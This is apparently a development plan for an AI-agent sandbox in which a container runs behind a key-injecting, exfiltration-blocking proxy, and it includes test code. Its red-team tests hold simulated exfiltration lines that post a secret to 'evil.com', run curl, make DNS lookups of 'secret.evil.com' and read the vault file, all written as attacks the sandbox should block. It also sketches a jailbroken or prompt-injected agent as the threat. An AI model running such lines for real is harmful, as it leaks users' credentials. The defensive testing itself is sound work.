# Tier 2 Completion Plan - Full Integration & Testing

**Goal**: Complete Tier 2 (container isolation) with end-to-end testing that proves secrets NEVER enter containers and the proxy transparently injects keys.

**Current State**: Infrastructure exists (60% done), orchestration missing (40% to go)

---

## What's Already Built (Verified with 142 tests)

### ✅ Container Infrastructure
- **builder.py**: Docker config with hardening (caps dropped, read-only FS, resource limits)
- **runner.py**: Container lifecycle (start, stop, logs)
- **Tests**: 9 tests verify config correctness

### ✅ Proxy Infrastructure  
- **addon.py**: ArmorAddon for mitmproxy (key injection + content scanning)
- **injector.py**: LLM provider detection (OpenAI, Anthropic, etc.)
- **runner.py**: Proxy startup with async support (fixed)
- **Tests**: 13 tests verify injection logic and blocking

### ✅ Integration Tests (Config Level)
- **11 Docker tests**: Verify container config prevents secret leakage
- **Limitation**: Tests check CONFIG, not actual RUNTIME behavior

### ❌ Missing: Orchestration
- CLI run command for Tier 2 is a placeholder 
- No end-to-end test that actually runs a container with proxy
- No verification that keys are actually injected at runtime

---

## Phase 5: Tier 2 Orchestration (Make It Run)

### Task 5.1 - Complete CLI Run Command for Tier 2

**File**: `src/hermes_aegis/cli.py` (lines 210-214 are placeholder)

**What to implement**:

```python
elif tier == 2:
    # Tier 2: Run in container with proxy
    click.echo(f"[Tier {tier}] Starting proxy and container...")
    
    # 1. Load vault secrets
    from hermes_aegis.vault.keyring_store import get_or_create_master_key
    from hermes_aegis.vault.store import VaultStore
    
    master_key = get_or_create_master_key()
    vault = VaultStore(VAULT_PATH, master_key)
    
    vault_secrets = {
        "OPENAI_API_KEY": vault.get("OPENAI_API_KEY"),
        "ANTHROPIC_API_KEY": vault.get("ANTHROPIC_API_KEY"),
        # Add other LLM providers as needed
    }
    vault_secrets = {k: v for k, v in vault_secrets.items() if v is not None}
    vault_values = vault.get_all_values()
    
    # 2. Start proxy in background
    from hermes_aegis.proxy.runner import start_proxy
    
    proxy_thread = start_proxy(
        vault_secrets=vault_secrets,
        vault_values=vault_values,
        audit_trail=trail,
        listen_port=8443
    )
    
    click.echo("Proxy started on port 8443")
    time.sleep(1)  # Give proxy time to bind
    
    # 3. Ensure Docker network exists
    import docker
    from hermes_aegis.container.builder import ensure_network, ContainerConfig, build_run_args
    
    client = docker.from_env()
    network = ensure_network(client)
    
    # 4. Start container
    from hermes_aegis.container.runner import ContainerRunner
    
    workspace = Path.cwd()  # Use current directory as workspace
    config = ContainerConfig(
        workspace_path=str(workspace),
        proxy_host="host.docker.internal",
        proxy_port=8443
    )
    
    runner = ContainerRunner(workspace_path=str(workspace))
    runner.start()
    
    click.echo("Container started")
    
    # 5. Execute command in container
    # TODO: Need to add exec() method to ContainerRunner
    exit_code = runner.exec(list(command))
    
    # 6. Cleanup
    runner.stop()
    click.echo("Container stopped")
```

**Tests to write**:
1. Test proxy actually starts (check port 8443 is listening)
2. Test container actually starts (check docker ps)
3. Test command execution (mock for unit test)

**Integration test** (manual for now):
```bash
hermes-aegis run curl https://api.openai.com/v1/models
# Should: start proxy, start container, curl inside sees injected key
```

---

### Task 5.2 - Add Container Exec Method

**File**: `src/hermes_aegis/container/runner.py`

**What to add**:

```python
class ContainerRunner:
    # ... existing code ...
    
    def exec(self, command: list[str], stream_output: bool = True) -> int:
        """Execute a command inside the running container.
        
        Args:
            command: Command as list (e.g., ['python', 'script.py'])
            stream_output: Print output in real-time
            
        Returns:
            Exit code from command
        """
        if self._container is None:
            raise RuntimeError("Container not started")
        
        exec_result = self._container.exec_run(
            command,
            stdout=True,
            stderr=True,
            stream=stream_output
        )
        
        if stream_output:
            for line in exec_result.output:
                print(line.decode(), end='')
        
        return exec_result.exit_code
```

**Test**:
```python
def test_exec_runs_command_in_container(mock_docker):
    runner = ContainerRunner(workspace_path="/tmp/test")
    runner.start()
    
    exit_code = runner.exec(['echo', 'hello'])
    
    mock_container.exec_run.assert_called_once()
    assert exit_code == 0
```

---

### Task 5.3 - Real End-to-End Integration Test

**File**: `tests/integration/test_tier2_e2e.py`

**What to test**:

```python
@pytest.mark.skipif(not docker_available(), reason="Docker required")
@pytest.mark.integration
def test_tier2_blocks_exfiltration_from_container(tmp_path, test_http_server):
    """
    End-to-end: Container tries to exfiltrate secret, proxy blocks it.
    
    Setup:
    1. Create vault with secret
    2. Start proxy with vault
    3. Start container with proxy env
    4. Run Python script inside container that tries to exfiltrate
    5. Verify: Request blocked, server never received it
    """
    # 1. Setup vault
    master_key = Fernet.generate_key()
    vault = VaultStore(tmp_path / "vault.enc", master_key)
    vault.set("SECRET", "sk-test-secret-xyz")
    
    # 2. Start test HTTP server on host
    server = start_test_server(port=9999)
    
    # 3. Start proxy
    trail = AuditTrail(tmp_path / "audit.jsonl")
    proxy_thread = start_proxy(
        vault_secrets={"SECRET": "sk-test-secret-xyz"},
        vault_values=["sk-test-secret-xyz"],
        audit_trail=trail,
        listen_port=8443
    )
    time.sleep(1)
    
    # 4. Create exfiltration script
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    
    script = workspace / "exfil.py"
    script.write_text("""
import requests
# Try to exfiltrate the secret
response = requests.post('http://host.docker.internal:9999/exfil', 
                        json={'stolen': 'sk-test-secret-xyz'})
print(f"Status: {response.status_code}")
""")
    
    # 5. Run in container
    runner = ContainerRunner(workspace_path=str(workspace))
    runner.start()
    
    try:
        exit_code = runner.exec(['python', '/workspace/exfil.py'])
        
        # Verify: Script ran but request was blocked by proxy
        # Container saw 403 or connection error, NOT 200
        assert exit_code != 0 or "403" in runner.last_output
        
        # Verify: Test server on host never received the secret
        assert len(server.received_requests) == 0, \
            "Secret reached server - proxy didn't block!"
        
        # Verify: Audit trail logged the block
        entries = trail.read_all()
        blocked_entries = [e for e in entries if "BLOCKED" in e.decision]
        assert len(blocked_entries) > 0, "Proxy didn't log the block"
        
    finally:
        runner.stop()
        server.shutdown()
```

**This test proves**:
- Proxy actually intercepts container traffic
- Secrets are actually blocked
- Container never sees vault
- Audit trail records the block

---

### Task 5.4 - Test Transparent Key Injection

**File**: `tests/integration/test_tier2_key_injection.py`

**What to test**:

```python
@pytest.mark.skipif(not docker_available(), reason="Docker required")
@pytest.mark.integration  
def test_tier2_injects_openai_key_transparently(tmp_path, mock_openai_server):
    """
    End-to-end: Container makes OpenAI API call without key, proxy injects it.
    
    Setup:
    1. Vault has OPENAI_API_KEY
    2. Mock OpenAI API server on host
    3. Start proxy
    4. Container script calls api.openai.com WITHOUT key
    5. Verify: Proxy injected key, OpenAI mock received it, container never saw it
    """
    # 1. Setup vault
    master_key = Fernet.generate_key()
    vault = VaultStore(tmp_path / "vault.enc", master_key)
    vault.set("OPENAI_API_KEY", "sk-injected-by-proxy")
    
    # 2. Start mock OpenAI server (records headers received)
    mock_server = MockOpenAI Server(port=9998)
    mock_server.start()
    
    # 3. Start proxy
    trail = AuditTrail(tmp_path / "audit.jsonl")
    proxy_thread = start_proxy(
        vault_secrets={"OPENAI_API_KEY": "sk-injected-by-proxy"},
        vault_values=["sk-injected-by-proxy"],
        audit_trail=trail,
        listen_port=8443
    )
    time.sleep(1)
    
    # 4. Create test script (no key in code)
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    
    script = workspace / "test_api.py"
    script.write_text("""
import requests
# No API key in environment or code
response = requests.get('http://api.openai.com/v1/models')
print(f"Status: {response.status_code}")
""")
    
    # 5. Run in container
    runner = ContainerRunner(workspace_path=str(workspace))
    runner.start()
    
    try:
        exit_code = runner.exec(['python', '/workspace/test_api.py'])
        
        # Verify: Request succeeded (proxy injected key)
        assert exit_code == 0
        
        # Verify: Mock server received Authorization header
        assert len(mock_server.requests) == 1
        req = mock_server.requests[0]
        assert req.headers.get("Authorization") == "Bearer sk-injected-by-proxy"
        
        # Verify: Container environment never had the key
        env_dump = runner.exec(['env'])
        assert "sk-injected-by-proxy" not in env_dump
        
    finally:
        runner.stop()
        mock_server.shutdown()
```

**This proves**:
- Proxy successfully injects keys
- Container code works without knowing the key
- Transparent to containerized agent

---

### Task 5.5 - Test Tier 2 Prevents Bypass Attacks

**File**: `tests/integration/test_tier2_bypass.py`

**Scenarios to test**:

#### 5.5a - DNS Exfiltration (Should be MITIGATED)

```python
def test_dns_exfiltration_via_container_network_policy():
    """
    Container network should be restricted.
    DNS query to evil.com should fail or be logged.
    """
    # Script tries: socket.getaddrinfo('sk-secret.evil.com', 80)
    # Expected: Fails (no network) or logged by proxy
```

#### 5.5b - Raw Socket Bypass (Should be BLOCKED)

```python
def test_raw_socket_fails_in_container():
    """
    Container should not be able to create raw sockets.
    """
    # Script tries: socket.socket(socket.AF_INET, socket.SOCK_RAW)
    # Expected: Permission denied (CAP_NET_RAW dropped)
```

#### 5.5c - Process Spawning (Should be BLOCKED)

```python
def test_curl_binary_not_available_in_container():
    """
    Container image should not have curl/wget/netcat.
    """
    # Script tries: subprocess.run(['curl', 'evil.com'])
    # Expected: FileNotFoundError (curl not in image)
```

#### 5.5d - File System Escape (Should be BLOCKED)

```python
def test_cannot_write_outside_workspace():
    """
    Container filesystem is read-only except workspace.
    """
    # Script tries: open('/tmp/secret.txt', 'w').write(secret)
    # Expected: OSError (Read-only filesystem)
```

---

## Phase 6: Tier 2 Container Image

### Task 6.1 - Build Minimal Python Container

**File**: `src/hermes_aegis/container/Dockerfile`

**Requirements**:
- Python 3.11+
- requests, urllib3 (for HTTP)
- NO curl, wget, netcat, nslookup, dig
- Non-root user `hermes`
- Minimal base (alpine or distroless)

**Dockerfile**:
```dockerfile
FROM python:3.11-alpine

# Create non-root user
RUN adduser -D -u 1000 hermes

# Install only essential packages
RUN pip install --no-cache-dir requests urllib3

# Set working directory
WORKDIR /workspace

# Run as non-root
USER hermes

# Default: Drop into shell (overridden by exec)
CMD ["/bin/sh"]
```

**Test**:
- Build image: `docker build -t hermes-aegis:latest -f src/hermes_aegis/container/Dockerfile .`
- Verify: `docker run hermes-aegis:latest which curl` returns empty (not found)
- Verify: `docker run hermes-aegis:latest whoami` returns `hermes`

---

### Task 6.2 - Network Policy Configuration

**File**: `src/hermes_aegis/container/builder.py`

**Add network restrictions**:

```python
def build_run_args(config: ContainerConfig) -> dict:
    # ... existing code ...
    return {
        # ... existing config ...
        
        # Restrict DNS (only use proxy)
        "dns": [config.proxy_host],
        
        # OR: More paranoid - no network at all except through proxy
        # "network_mode": "none",  # Then manually connect to armor network
    }
```

**Trade-off**:
- `dns: [proxy]` - DNS goes through proxy, can be monitored
- `network_mode: none` - Completely airgapped, only container→proxy allowed

**Test**:
- Container DNS query should route through proxy
- Direct DNS queries should fail or be logged

---

### Task 6.3 - Proxy Health Check

**File**: `src/hermes_aegis/proxy/runner.py`

**Add**:
```python
def wait_for_proxy_ready(port: int, timeout: int = 5) -> bool:
    """Poll until proxy is listening on port."""
    import socket
    import time
    
    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket()
            sock.connect(('localhost', port))
            sock.close()
            return True
        except OSError:
            time.sleep(0.1)
    return False
```

**Use in CLI**:
```python
proxy_thread = start_proxy(...)
if not wait_for_proxy_ready(8443):
    raise RuntimeError("Proxy failed to start")
```

---

## Phase 7: Integration Testing (Real Execution)

### Task 7.1 - Test Real Agent Execution in Container

**File**: `tests/integration/test_real_agent.py`

**What to test**:

```python
@pytest.mark.integration
@pytest.mark.docker
def test_agent_can_run_in_tier2_container():
    """
    Run actual hermes agent command inside container.
    Verify it works and secrets are protected.
    """
    # 1. Setup vault with OpenAI key
    # 2. Start proxy + container
    # 3. Run: hermes chat -q "What's 2+2?" 
    # 4. Verify: Response received (proves agent works)
    # 5. Verify: Container never saw API key (env dump)
    # 6. Verify: Proxy logged key injection (audit trail)
```

**This is the ULTIMATE test** - proves the entire Tier 2 architecture works end-to-end.

---

### Task 7.2 - Test Multi-Request Scenarios

**What to test**:

1. **Multiple LLM providers**: OpenAI then Anthropic in same container
2. **Mixed traffic**: LLM calls + regular HTTP + blocked exfiltration
3. **Long-running container**: Multiple agent conversations in same container
4. **Container restart**: Proxy survives, new container connects

**Files**: `tests/integration/test_tier2_scenarios.py`

---

### Task 7.3 - Performance Benchmarks

**What to measure**:

1. **Proxy overhead**: Latency added to HTTP requests
2. **Container startup time**: How long to start proxy + container
3. **Scanner performance**: Time to scan request with 100 vault secrets
4. **Memory usage**: Proxy + container overhead

**Acceptable targets**:
- Proxy latency: <10ms per request
- Startup: <5 seconds (proxy + container)
- Scan: <1ms per request
- Memory: <512MB total overhead

**Files**: `tests/benchmarks/test_performance.py`

---

## Phase 8: Real-World Attack Simulation

### Task 8.1 - Red Team Scenarios

**Create attack scripts that try everything**:

1. **Multi-vector attack**: Try HTTP, DNS, socket, subprocess in sequence
2. **Sophisticated encoding**: Chunked strings, hex, unicode, nested encoding
3. **Indirect channels**: Write secret to file, exfil file later
4. **Timing attacks**: Measure response time to infer secret bits
5. **Container escape**: Try to break out to host

**Expected results**:
- HTTP: BLOCKED ✅
- DNS: Fails (no network) or logged ⚠️
- Socket: Permission denied ✅
- Subprocess: curl not found ✅
- Files: Write succeeds, exfil blocked ⚠️
- Timing: Not defended ❌ (out of scope)
- Escape: Blocked (dropped caps, read-only FS) ✅

**Document**: Which attacks work, which don't, why.

---

### Task 8.2 - Malicious Agent Simulation

**Scenario**: Agent is compromised (jailbroken, prompt-injected)

**Test script**:
```python
# Simulated malicious agent code
vault_secret = os.environ.get("OPENAI_API_KEY")  # Should be None
print(f"Got secret from env: {vault_secret}")

# Try to read vault file
try:
    vault_path = Path.home() / ".hermes-aegis" / "vault.enc"
    content = vault_path.read_text()
    print(f"Read vault: {len(content)} bytes")
except FileNotFoundError:
    print("Vault not accessible - ✅ PROTECTED")

# Try to exfiltrate via HTTP
import requests
try:
    requests.post("http://evil.com/exfil", json={"secret": vault_secret})
except Exception as e:
    print(f"HTTP blocked: {e} - ✅ PROTECTED")

# Try subprocess
import subprocess
try:
    subprocess.run(['curl', 'evil.com'], check=True)
except FileNotFoundError:
    print("curl not available - ✅ PROTECTED")

# Try DNS
import socket
try:
    socket.getaddrinfo('secret.evil.com', 80)
except socket.gaierror:
    print("DNS failed - ✅ PROTECTED")
```

**Expected output**: Every attack fails, script prints "✅ PROTECTED"

**This proves Tier 2 actually works against a determined attacker.**

---

## Estimated Effort

| Phase | Tasks | Effort | Complexity |
|-------|-------|--------|------------|
| Phase 5: Orchestration | 3 tasks | 4-6 hours | Medium |
| Phase 6: Container Image | 2 tasks | 2-3 hours | Low |
| Phase 7: Integration Tests | 3 tasks | 3-4 hours | High |
| Phase 8: Red Team | 2 tasks | 2-3 hours | Medium |
| **Total** | **10 tasks** | **11-16 hours** | **Medium-High** |

---

## Dependencies & Risks

### External Dependencies
- **Docker Desktop must be running** (obvious)
- **mitmproxy** already in dependencies ✅
- **Network access** for testing (localhost sufficient)

### Risks

1. **Proxy binding issues**: Port 8443 might be in use
   - **Mitigation**: Auto-select port or make configurable

2. **Container DNS resolution**: host.docker.internal doesn't always work
   - **Mitigation**: Use host-gateway extra_hosts (already done)

3. **mitmproxy CA certificate**: Container won't trust it
   - **Mitigation**: Use `ssl_insecure=True` in proxy (already done)
   - **Alternative**: Install CA cert in container image

4. **Performance**: Proxy might add too much latency
   - **Mitigation**: Benchmark first, optimize if needed

5. **Real LLM calls are expensive** (testing API injection)
   - **Mitigation**: Use mock servers (already planned)

---

## Success Criteria (Tier 2 Complete)

### Functionality
- ✅ `hermes-aegis run python script.py` starts container + proxy
- ✅ Commands execute inside container
- ✅ Proxy injects API keys transparently
- ✅ Secrets never enter container (verified at runtime)
- ✅ Exfiltration attempts blocked (verified with real tests)

### Testing
- ✅ All 142 tests pass (including Docker tests)
- ✅ At least 3 integration tests (e2e, key injection, bypass prevention)
- ✅ Performance benchmarks documented
- ✅ Red team attack simulation passes (all attacks fail)

### Documentation
- ✅ README updated with Tier 2 usage examples
- ✅ Integration test results added
- ✅ Tier 1 vs Tier 2 trade-offs documented

---

## Recommended Approach

### Option A: Complete Tier 2 Now (11-16 hours)
**Pros**: Full feature-complete MVP, proves architecture
**Cons**: Significant time investment, complex debugging

### Option B: Ship Tier 1 MVP, Tier 2 as v1.1 (recommended)
**Pros**: Tier 1 is already solid and tested, fast delivery
**Cons**: Tier 2 promise not fulfilled yet

### Option C: Delegate to Subagent (4-6 hours supervised)
**Pros**: Parallel work, I can delegate Phases 5-6, supervise Phase 7-8
**Cons**: Integration tests require real Docker, harder to parallelize

**My recommendation**: **Option B or C** 

**Rationale**: 
- Tier 1 is complete, tested, valuable on its own
- Tier 2 is complex infrastructure (Docker, proxy, networking)
- Better to ship working Tier 1 than wait for perfect Tier 2
- Can iterate on Tier 2 based on real usage feedback

---

## Next Steps

**If proceeding with Tier 2 completion**:

1. Start with Phase 5 (orchestration) - makes CLI actually work
2. Build minimal container image (Phase 6.1)
3. Write ONE integration test (Task 7.1) - proves it works
4. If that passes, continue with full Phase 7-8
5. If blocked, document blockers and ship Tier 1

**If shipping Tier 1 now**:

1. Tag current state as v0.1.0-tier1
2. Update README to note Tier 2 is "planned for v1.1"
3. Create GitHub issues for Tier 2 tasks
4. Ship and gather feedback

---

**What's your preference? Build Tier 2 now, ship Tier 1 as MVP, or hybrid approach?**